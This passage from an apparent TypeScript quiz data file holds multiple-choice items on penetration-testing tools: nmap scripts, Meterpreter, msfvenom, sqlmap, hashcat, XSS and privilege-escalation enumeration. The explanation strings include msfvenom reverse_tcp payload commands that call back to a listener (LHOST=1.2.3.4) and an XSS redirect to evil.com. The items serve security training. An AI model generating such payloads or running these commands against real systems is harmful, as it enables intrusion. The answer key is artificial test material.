    de: "nmap -p 80 --script http-csrf target. Token. Form. Protection."
  }),
  (_i: number) => ({
    q: "What does `getuid` in Meterpreter show?",
    o: ["Current process user ID", "User ID", "UID", "Process user"],
    c: 0,
    e: "getuid. Meterpreter. Current. User. SYSTEM. Admin. Privilege.",
    de: "getuid. NT AUTHORITY\SYSTEM. Privilege. Escalation. Check."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -f psh` create?",
    o: ["PowerShell payload", "PowerShell", "PSH format", "PS script"],
    c: 0,
    e: "msfvenom -f psh. PowerShell. .ps1. Script. Execute. Windows.",
    de: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 -f psh -o shell.ps1."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --threads=10` do?",
    o: ["10 concurrent requests", "Threads", "Parallel", "Concurrent"],
    c: 0,
    e: "sqlmap --threads=10. Parallel. 10. Faster. Requests. Rate.",
    de: "sqlmap -u URL --threads=10. Speed. 10 concurrent. Faster."
  }),
  (_i: number) => ({
    q: "What does `location` or `document.URL` in XSS allow?",
    o: ["Redirect or phishing (URL manipulation)", "URL access", "Redirect", "Phishing"],
    c: 0,
    e: "location. URL. Redirect. Phishing. document.URL. Manipulate.",
    de: "location='http://evil.com'. Redirect. Phishing. XSS. Steal."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 7500` crack?",
    o: ["Kerberos AS-REP (Kerberoasting)", "Kerberos AS-REP", "Hash 7500", "AS-REP"],
    c: 0,
    e: "hashcat -m 7500. Kerberos. AS-REP. No preauth. Kerberoasting.",
    de: "hashcat -m 7500 asrep.txt wordlist. Kerberos. AS-REP. Crack."
  }),
  (_i: number) => ({
    q: "What does `ps aux` show for priv esc?",
    o: ["Running processes (interesting services?)", "Process list", "Services", "Process enum"],
    c: 0,
    e: "ps aux. Processes. Services. Root. Exploit. Cron. Enum.",
    de: "ps aux. MySQL. Redis. Root. Cron. Exploit. Service."
  }),
  (_i: number) => ({
    q: "What does `nmap -sV --version-light` do?",
    o: ["Fewer version probes (faster)", "Light version", "Fast version", "Fewer probes"],
    c: 0,
    e: "version-light. Fewer. Faster. Less accurate. Quick. Scan.",
    de: "nmap -sV --version-light. Quick. Less probes. Speed."
  }),
  (_i: number) => ({
    q: "What does `nmap --script http-sql-injection target` do?",
    o: ["Tests for SQLi in web params", "SQLi test", "HTTP SQLi", "Web SQLi"],
    c: 0,
    e: "http-sql-injection. Basic. SQLi. Test. Parameter. Error.",
    de: "nmap -p 80 --script http-sql-injection target. Basic. sqlmap better."
  }),
  (_i: number) => ({
    q: "What does `shell` in Meterpreter do?",
    o: ["Drops to OS shell", "OS shell", "Shell", "Command shell"],
    c: 0,
    e: "shell. Meterpreter. OS. cmd. bash. Interactive. Commands.",
    de: "shell. whoami. exit. Background. OS shell. Commands."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -f asp` create?",
    o: ["ASP payload (IIS)", "ASP format", "IIS payload", "ASP script"],
    c: 0,
    e: "msfvenom -f asp. ASP. IIS. Windows. Web. Script.",
    de: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 -f asp."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --proxy=http://127.0.0.1:8080` do?",
    o: ["Routes through Burp (inspect/modify)", "Burp proxy", "Proxy traffic", "Burp"],
    c: 0,
    e: "sqlmap --proxy. Burp. Intercept. Modify. Inspect. Debug.",
    de: "sqlmap -u URL --proxy=http://127.0.0.1:8080. Burp. Traffic."
  }),
  (_i: number) => ({
    q: "What does `SameSite=Lax` cookie prevent?",
    o: ["CSRF (no cross-site send)", "CSRF mitigation", "SameSite", "Cross-site"],
    c: 0,
    e: "SameSite=Lax. Cross-site. POST. No. CSRF. GET. Top-level.",
    de: "Set-Cookie: session=abc; SameSite=Lax. CSRF. Cross-site. Mitigation."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 22000` crack?",
    o: ["WPA-PBKDF2-PMKID", "WPA PMKID", "Hash 22000", "WiFi"],
    c: 0,
    e: "hashcat -m 22000. WPA. PMKID. WiFi. hcxdumptool. Capture.",
    de: "hashcat -m 22000 wpa.txt wordlist. WiFi. PMKID. No handshake."
  }),
  (_i: number) => ({
    q: "What does `netstat -tulpn` show for priv esc?",
    o: ["Listening ports (internal services?)", "Listening ports", "Netstat", "Port enum"],
    c: 0,
    e: "netstat -tulpn. Listen. Ports. Internal. Redis. MySQL. Exploit.",
    de: "netstat -tulpn. 127.0.0.1:6379. Redis. Internal. Exploit."
  }),
  (_i: number) => ({
    q: "What does `nmap -sC` equivalent to?",
    o: ["--script=default", "Default scripts", "Script default", "NSE default"],
    c: 0,
    e: "nmap -sC = --script=default. Safe. Common. Discovery. Vuln.",
    de: "nmap -sC. Equivalent. --script=default. Default. NSE."
  }),
  (_i: number) => ({
    q: "What does `nmap --script http-stored-xss target` test?",
    o: ["Stored XSS in forms", "Stored XSS", "XSS test", "Form XSS"],
    c: 0,
    e: "http-stored-xss. Basic. XSS. Stored. Form. Input. Test.",
    de: "nmap -p 80 --script http-stored-xss target. Basic. Manual better."
  }),
  (_i: number) => ({
    q: "What does `sysinfo` in Meterpreter show?",
    o: ["Target OS, version, arch", "System info", "OS info", "Target info"],
    c: 0,
    e: "sysinfo. Meterpreter. OS. Version. Arch. Computer. Info.",
    de: "sysinfo. Windows 10. x64. Computer name. Recon."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -f dll` create?",
    o: ["Windows DLL", "DLL format", "DLL payload", "Windows DLL"],
    c: 0,
    e: "msfvenom -f dll. DLL. Windows. Load. Inject. DLL. Load.",
    de: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 -f dll -o shell.dll."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --risk=3` enable?",
    o: ["OR-based injection (more tests)", "Risk 3", "OR injection", "More tests"],
    c: 0,
    e: "sqlmap --risk 1-3. 3 = OR. More. Tests. Dangerous. Data.",
    de: "sqlmap -u URL --risk=3. OR. More. UPDATE. Dangerous."
  }),
  (_i: number) => ({
    q: "What does `localStorage` in XSS allow?",
    o: ["Persistent data theft (survives refresh)", "LocalStorage theft", "Persistent", "Storage"],
    c: 0,
    e: "localStorage. XSS. Steal. Persistent. Survive. Refresh. Data.",
    de: "XSS. localStorage. Steal. Sensitive. Persistent. Theft."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 100` crack?",
    o: ["SHA1", "SHA1", "Hash 100", "SHA-1"],
    c: 0,
    e: "hashcat -m 100. SHA1. 40 hex. Raw. No salt. Simple.",
    de: "hashcat -m 100 sha1.txt wordlist. 40 char. SHA1. Raw."
  }),
  (_i: number) => ({
    q: "What does `ls -la /tmp` show for priv esc?",
    o: ["Writable files (other users?)", "Tmp writable", "Tmp files", "World writable"],
    c: 0,
    e: "ls -la /tmp. Writable. Other. Cron. Script. Execute. Escalate.",
    de: "tmp. /tmp/script. Cron. Root. Writable. Exploit."
  }),
];
